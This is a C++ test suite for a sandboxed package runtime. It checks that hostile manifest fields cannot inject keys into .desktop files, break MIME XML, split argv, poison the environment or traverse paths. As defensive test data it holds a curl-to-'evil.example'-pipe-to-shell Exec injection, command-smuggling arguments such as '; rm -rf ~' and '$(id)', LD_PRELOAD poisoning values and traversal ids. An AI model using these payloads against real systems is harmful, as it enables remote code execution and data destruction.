// Security-boundary tests — the adversarial cases the existing suites did not
// reach.
//
// tests/test_package.cpp and tests/test_hostile_packages.cpp already attack the
// CONTAINER: malicious entry paths, duplicate and case-colliding entries,
// over-long components, corrupt ZIP structure, tampered payloads, substituted
// signatures, uncovered and missing hash entries, architecture mismatch. Those
// are not repeated here.
//
// What was untested is everything downstream of a package that VERIFIES: what
// happens when its declared strings are hostile rather than its bytes. A
// manifest is attacker-controlled data that ends up in a `.desktop` file, an XML
// document, a process argv, an environment, and a sandbox bind list. Each of
// those is a different injection surface with a different escape, and each of
// them was being relied on without a test.
//
// Every case asserts more than "it failed". The requirement from the wave is
// that a rejection fails SAFELY, EXPLAINS itself, and leaves NO unintended
// residue, so the checks look for the reason in the message and for the absence
// of the thing that should not have been created.

#include <doctest/doctest.h>

#include "helpers.hpp"

#include "lexe/base/error.hpp"
#include "lexe/base/util.hpp"
#include "lexe/integration/desktop.hpp"
#include "lexe/base/identity.hpp"
#include "lexe/package/manifest.hpp"
#include "lexe/sandbox/isolation.hpp"

#include <nlohmann/json.hpp>

#include <algorithm>
#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;
using namespace lexe;
using nlohmann::json;

namespace {

bool has(const std::string& haystack, const std::string& needle) {
    return haystack.find(needle) != std::string::npos;
}

/// A minimal valid manifest, as JSON, so a case can make ONE field hostile and
/// leave everything else obviously fine.
json base_manifest() {
    return json{
        {"lexeVersion", "0.1"},
        {"id", "com.example.app"},
        {"name", "Example"},
        {"version", "1.0.0"},
        {"publisher", json{{"name", "Example Publisher"},
                           {"publicKey", "ed25519:" + std::string(43, 'A') + "="}}},
        {"applicationType", "native"},
        {"architectures", json::array({"x86_64"})},
        {"entrypoint", json{{"executable", "bin/app"},
                            {"arguments", json::array()}}},
        {"install", json{{"scope", "user"}, {"mode", "bundled"}}},
        {"permissions", json::array()},
    };
}

Manifest parse(const json& j) { return Manifest::parse(j.dump()); }

/// Parse and report the message, or "" when it was accepted.
std::string rejection_of(const json& j) {
    try {
        Manifest::parse(j.dump());
        return {};
    } catch (const std::exception& e) {
        return e.what();
    }
}

} // namespace

TEST_SUITE("security-boundary") {

// ------------------------------------------------- desktop file injection
//
// The generated `.desktop` file is a key=value document that a desktop
// environment executes. A name carrying a literal newline could close the Name
// key and open one of its own — Exec, TryExec, or a second [Desktop Entry]
// group — so the application would run something other than `lexe run <id>`.

TEST_CASE("a name with a newline cannot inject a desktop entry key") {
    json j = base_manifest();
    j["name"] = "Innocent\nExec=/bin/sh -c 'curl evil.example | sh'\nX=";
    const Manifest manifest = parse(j);
    const std::string entry = desktop::desktop_entry_text(manifest);

    // Whatever the name contained, there is exactly one Exec line and it is ours.
    std::size_t exec_lines = 0;
    std::size_t entry_groups = 0;
    // Scan by line start, which is what a Desktop Entry parser does.
    std::vector<std::string> lines;
    std::string current;
    for (const char c : entry) {
        if (c == '\n') { lines.push_back(current); current.clear(); }
        else { current += c; }
    }
    if (!current.empty()) lines.push_back(current);
    for (const std::string& line : lines) {
        if (line.rfind("Exec=", 0) == 0) ++exec_lines;
        if (line == "[Desktop Entry]") ++entry_groups;
    }
    CHECK(exec_lines == 1);
    CHECK(entry_groups == 1);
    for (const std::string& line : lines) {
        CAPTURE(line);
        if (line.rfind("Exec=", 0) == 0) {
            CHECK(has(line, "lexe"));
            CHECK_FALSE(has(line, "curl"));
        }
    }
    // The newline survives as an ESCAPE, not as a line break: the name is still
    // reported truthfully, it just cannot terminate the value.
    CHECK(has(entry, "\\n"));
}

TEST_CASE("a name with a semicolon cannot extend a list value") {
    // Categories and MimeType are semicolon-separated. An unescaped ';' in a
    // value that lands in one of those lists adds an element.
    json j = base_manifest();
    j["name"] = "App;Evil";
    j["integration"] = json{{"desktopEntry", true},
                            {"categories", json::array({"Utility;Settings"})}};
    const Manifest manifest = parse(j);
    const std::string entry = desktop::desktop_entry_text(manifest);
    for (const std::string& key : {std::string("Categories=")}) {
        const std::size_t at = entry.find(key);
        if (at == std::string::npos) continue;
        const std::string value =
            entry.substr(at + key.size(),
                         entry.find('\n', at) - at - key.size());
        CAPTURE(value);
        // The injected separator is escaped, so "Utility;Settings" stays ONE
        // category rather than becoming two.
        CHECK(has(value, "\\;"));
    }
}

TEST_CASE("Exec always runs the runtime, never a path out of the package") {
    // The launch command must name `lexe run <id>` and must never be a payload
    // path: a desktop entry pointing straight at the payload would launch it
    // with no verification, no trust check and no sandbox.
    json j = base_manifest();
    j["entrypoint"] = json{{"executable", "bin/app"}, {"arguments", json::array()}};
    const Manifest manifest = parse(j);
    const std::string entry = desktop::desktop_entry_text(manifest);
    const std::size_t at = entry.find("Exec=");
    REQUIRE(at != std::string::npos);
    const std::string exec = entry.substr(at, entry.find('\n', at) - at);
    CAPTURE(exec);
    CHECK(has(exec, "lexe run"));
    CHECK(has(exec, manifest.id));
    CHECK_FALSE(has(exec, "bin/app"));
}

TEST_CASE("a name with markup metacharacters cannot break the MIME XML") {
    json j = base_manifest();
    j["name"] = "A & B <script>alert(\"x\")</script>";
    // The name reaches the document as a <comment>, and only when the package
    // declares a file association -- without one there are no <mime-type>
    // elements for a comment to sit in, so a test with no association would pass
    // while proving nothing.
    j["integration"] = json{
        {"desktopEntry", true},
        {"fileAssociations",
         json::array({json{{"extension", ".example"},
                           {"mimeType", "application/x-example"},
                           {"description", "Example & <file>"}}})}};
    const Manifest manifest = parse(j);
    const std::string xml = desktop::mime_xml_text(manifest);

    // The comment is present, so the escaping below is actually under test.
    REQUIRE(has(xml, "<comment>"));
    // And no raw metacharacter from the name survived into it.
    CHECK_FALSE(has(xml, "<script>"));
    CHECK_FALSE(has(xml, "A & B"));
    const bool ampersand_escaped = has(xml, "&amp;");
    const bool tag_escaped = has(xml, "&lt;script&gt;");
    CHECK(ampersand_escaped);
    CHECK(tag_escaped);

    // Tags still balance, so the document did not become malformed.
    const auto opens = std::count(xml.begin(), xml.end(), '<');
    const auto closes = std::count(xml.begin(), xml.end(), '>');
    CHECK(opens == closes);
}

TEST_CASE("a hostile mime type or extension cannot escape its XML attribute") {
    // Both land in attribute values: type="..." and pattern="...". A raw quote
    // would close the attribute and let the rest become markup.
    json j = base_manifest();
    j["integration"] = json{
        {"desktopEntry", true},
        {"fileAssociations",
         json::array({json{{"extension", ".a\"/><evil x=\""},
                           {"mimeType", "application/x\"/><evil y=\""},
                           {"description", "d"}}})}};
    const std::string why = rejection_of(j);
    if (!why.empty()) {
        // Refusing outright is the stronger answer, and it is enough.
        INFO("refused at the manifest: " << why);
        CHECK_FALSE(why.empty());
        return;
    }
    const Manifest manifest = parse(j);
    const std::string xml = desktop::mime_xml_text(manifest);
    CHECK_FALSE(has(xml, "<evil"));
    CHECK(has(xml, "&quot;"));
    const auto opens = std::count(xml.begin(), xml.end(), '<');
    const auto closes = std::count(xml.begin(), xml.end(), '>');
    CHECK(opens == closes);
}

// ------------------------------------------------- argument injection
//
// `entrypoint.arguments` is attacker-controlled and becomes argv. argv is not a
// shell, so quoting cannot inject a command — but that is a property worth
// PINNING, because the day something builds a command string instead, every one
// of these becomes an execution bug.

TEST_CASE("declared arguments stay single argv elements") {
    json j = base_manifest();
    j["entrypoint"] = json{
        {"executable", "bin/app"},
        {"arguments", json::array({"; rm -rf ~", "$(id)", "`id`", "a b c",
                                   "--flag=x y", "|", "&&", "\n"})}};
    const Manifest manifest = parse(j);

    IsolationRequest req;
    req.app_id = manifest.id;
    req.app_root = "/apps/com.example.app/1.0.0";
    req.entrypoint = "/apps/com.example.app/1.0.0/bin/app";
    req.args = manifest.entrypoint_arguments;
    req.data_root = "/data/com.example.app";
    req.cache_root = "/cache/com.example.app";

    IsolationCapabilities caps;
    caps.status = CapabilityStatus::Available;
    caps.backend_present = caps.user_namespaces = true;
    caps.network_namespaces = caps.bind_mounts = true;
    const IsolationPlan plan = build_plan(req, caps);

    // Each declared argument appears as exactly itself, unsplit and unexpanded.
    for (const std::string& arg : manifest.entrypoint_arguments) {
        CAPTURE(arg);
        const auto occurrences =
            std::count(plan.app_argv.begin(), plan.app_argv.end(), arg);
        CHECK(occurrences == 1);
    }
    // And nothing was concatenated into a single shell string.
    CHECK(plan.app_argv.size() >= manifest.entrypoint_arguments.size());
}

// ------------------------------------------------- environment poisoning

TEST_CASE("the sandbox environment is an allowlist, whatever the caller had") {
    IsolationRequest req;
    req.app_id = "com.example.app";
    req.app_root = "/apps/com.example.app/1.0.0";
    req.entrypoint = "/apps/com.example.app/1.0.0/bin/app";
    req.data_root = "/data/com.example.app";
    req.cache_root = "/cache/com.example.app";
    // A representative sample of what an attacker would love to have inherited.
    req.inherited_env = {
        {"LD_PRELOAD", "/tmp/evil.so"},
        {"LD_LIBRARY_PATH", "/tmp/evil"},
        {"LD_AUDIT", "/tmp/evil.so"},
        {"PYTHONPATH", "/tmp/evil"},
        {"PERL5LIB", "/tmp/evil"},
        {"GCONV_PATH", "/tmp/evil"},
        {"DBUS_SESSION_BUS_ADDRESS", "unix:path=/run/user/1000/bus"},
        {"SSH_AUTH_SOCK", "/run/user/1000/keyring/ssh"},
        {"AWS_SECRET_ACCESS_KEY", "hunter2"},
        {"http_proxy", "http://evil.example"},
        {"XAUTHORITY", "/home/someone/.Xauthority"},
        {"HOME", "/home/someone"},
        {"PATH", "/tmp/evil/bin"},
    };

    const std::map<std::string, std::string> env = sanitize_environment(req);

    for (const auto& [name, value] : req.inherited_env) {
        CAPTURE(name);
        if (name == "HOME" || name == "PATH") {
            // Present, but REPLACED — never the caller's value.
            REQUIRE(env.count(name) == 1);
            CHECK(env.at(name) != value);
        } else {
            INFO("inherited by omission is how a sandbox leaks authority");
            CHECK(env.count(name) == 0);
        }
    }
    CHECK(env.at("HOME") == kSandboxData);
}

TEST_CASE("a console application is given no display, however the caller was launched") {
    IsolationRequest req;
    req.app_id = "com.example.app";
    req.app_root = "/apps/com.example.app/1.0.0";
    req.entrypoint = "/apps/com.example.app/1.0.0/bin/app";
    req.data_root = "/data/com.example.app";
    req.cache_root = "/cache/com.example.app";
    req.gui = false; // the manifest did not declare a GUI launch mode
    req.inherited_env = {{"DISPLAY", ":0"},
                         {"WAYLAND_DISPLAY", "wayland-0"},
                         {"XDG_RUNTIME_DIR", "/run/user/1000"}};

    const std::map<std::string, std::string> env = sanitize_environment(req);
    CHECK(env.count("DISPLAY") == 0);
    CHECK(env.count("WAYLAND_DISPLAY") == 0);
    CHECK(env.count("XDG_RUNTIME_DIR") == 0);

    IsolationCapabilities caps;
    caps.status = CapabilityStatus::Available;
    caps.backend_present = caps.user_namespaces = true;
    caps.network_namespaces = caps.bind_mounts = true;
    const IsolationPlan plan = build_plan(req, caps);
    for (const BindMount& bind : plan.binds) {
        CAPTURE(bind.host);
        CHECK_FALSE(has(bind.host, ".X11-unix"));
        CHECK_FALSE(has(bind.host, "wayland-"));
    }
}

// ------------------------------------------------- hostile identity strings

TEST_CASE("an id that is a path cannot become one") {
    // The id names directories under LEXE_HOME. A traversing id would write
    // outside the runtime's own tree.
    for (const std::string hostile : {"../escape", "a/b", "/absolute", "..",
                                      "com.example/../../etc",
                                      "com.example\\win", "com.example\nid"}) {
        json j = base_manifest();
        j["id"] = hostile;
        const std::string why = rejection_of(j);
        CAPTURE(hostile);
        INFO("an id like this must be refused by the manifest, not sanitized later");
        CHECK_FALSE(why.empty());
        CHECK(has(why, "id"));
    }
}

TEST_CASE("a version that is a path cannot become one") {
    // The version names the per-version directory and is part of lock and lease
    // file names.
    for (const std::string hostile :
         {"../1.0.0", "1.0.0/../..", "/1.0.0", "..", ".", "C:1.0.0",
          "1.0.0\\x"}) {
        json j = base_manifest();
        j["version"] = hostile;
        const std::string why = rejection_of(j);
        CAPTURE(hostile);
        INFO("refused at the manifest, so an unusable package cannot be built");
        CHECK_FALSE(why.empty());
    }
}

TEST_CASE("a version carrying whitespace is refused, because current.txt cannot hold it") {
    // REGRESSION. `apps/<id>/current.txt` is the fallback the registry uses when
    // the `current` symlink cannot be created, and it is read back through
    // trim_whitespace. So a version of "1.0.0 " was written faithfully and read
    // back as "1.0.0": the runtime resolved a current version whose directory did
    // not exist, and the application could not launch. The manifest and the
    // registry both called the version "free-form" and neither excluded
    // whitespace, while the file that stores it could not represent it.
    //
    // Proved by construction below: for each of these, a round trip through the
    // trim that current.txt performs does NOT return the original.
    for (const std::string hostile : {"1.0.0 ", " 1.0.0", "1.0.0\n", "1.0.0\t",
                                      "1.0.0\r", "1 0", "1.0.0\x01"}) {
        CAPTURE(hostile);
        json j = base_manifest();
        j["version"] = hostile;
        const std::string why = rejection_of(j);
        INFO("the earliest gate must refuse it, or an unlaunchable install is "
             "buildable");
        CHECK_FALSE(why.empty());
        CHECK(has(why, "version"));

        // And the shared rule agrees, so the registry refuses it too — installed
        // state can arrive from somewhere other than a package we built.
        CHECK_FALSE(version_string_is_valid(hostile));
    }
}

TEST_CASE("an ordinary version is still accepted") {
    // The fix must not have narrowed the format into uselessness: FORMAT-0.1 §5
    // calls the version free-form and §8 only defines an order over it.
    for (const std::string fine : {"1.0.0", "2024.10", "1.0.0-rc.1",
                                   "1.0.0+build.7", "v3", "0.1.0-alpha"}) {
        CAPTURE(fine);
        CHECK(version_string_is_valid(fine));
        json j = base_manifest();
        j["version"] = fine;
        CHECK(rejection_of(j).empty());
    }
}

TEST_CASE("an entrypoint that leaves the payload is refused") {
    for (const char* hostile : {"../../../bin/sh", "/bin/sh", "bin/../../sh",
                                "./../sh"}) {
        json j = base_manifest();
        j["entrypoint"] = json{{"executable", hostile},
                               {"arguments", json::array()}};
        const std::string why = rejection_of(j);
        CAPTURE(hostile);
        INFO("an entrypoint outside the payload would execute the host's binary");
        CHECK_FALSE(why.empty());
    }
}

// ------------------------------------------------- the sandbox plan itself

TEST_CASE("the application image is read-only, and HOME is not the user's") {
    IsolationRequest req;
    req.app_id = "com.example.app";
    req.app_root = "/apps/com.example.app/1.0.0";
    req.entrypoint = "/apps/com.example.app/1.0.0/bin/app";
    req.data_root = "/data/com.example.app";
    req.cache_root = "/cache/com.example.app";

    IsolationCapabilities caps;
    caps.status = CapabilityStatus::Available;
    caps.backend_present = caps.user_namespaces = true;
    caps.network_namespaces = caps.bind_mounts = true;
    const IsolationPlan plan = build_plan(req, caps);

    bool app_root_bound = false;
    for (const BindMount& bind : plan.binds) {
        if (bind.host != req.app_root.generic_string()) continue;
        app_root_bound = true;
        INFO("a writable application image lets a payload rewrite itself past "
             "the hash check");
        CHECK(bind.read_only);
    }
    CHECK(app_root_bound);

    // The real home must not be bound at all — not read-only, not anywhere.
    for (const BindMount& bind : plan.binds) {
        CAPTURE(bind.host);
        CHECK(bind.sandbox != "/home");
        const std::string real_home =
            util::get_env("HOME").value_or("/home/nobody");
        CHECK(bind.sandbox != real_home);
    }
}

TEST_CASE("a build is network-denied unconditionally, whatever it asked for") {
    // §16.6: compilation has no legitimate need for the network, and a build
    // that could reach it could fetch its own toolchain or exfiltrate source.
    IsolationRequest req;
    req.app_id = "com.example.portable";
    req.app_root = "/apps/com.example.portable/1.0.0";
    req.entrypoint = "/apps/com.example.portable/1.0.0/bin/app";
    req.data_root = "/data/com.example.portable";
    req.cache_root = "/cache/com.example.portable";
    req.build = true;
    req.network_allowed = true; // even asked for explicitly

    IsolationCapabilities caps;
    caps.status = CapabilityStatus::Available;
    caps.backend_present = caps.user_namespaces = true;
    caps.network_namespaces = caps.bind_mounts = true;
    const IsolationPlan plan = build_plan(req, caps);
    INFO("a build must never be given the network, even when the caller grants it");
    CHECK_FALSE(plan.network_shared);
}

} // TEST_SUITE
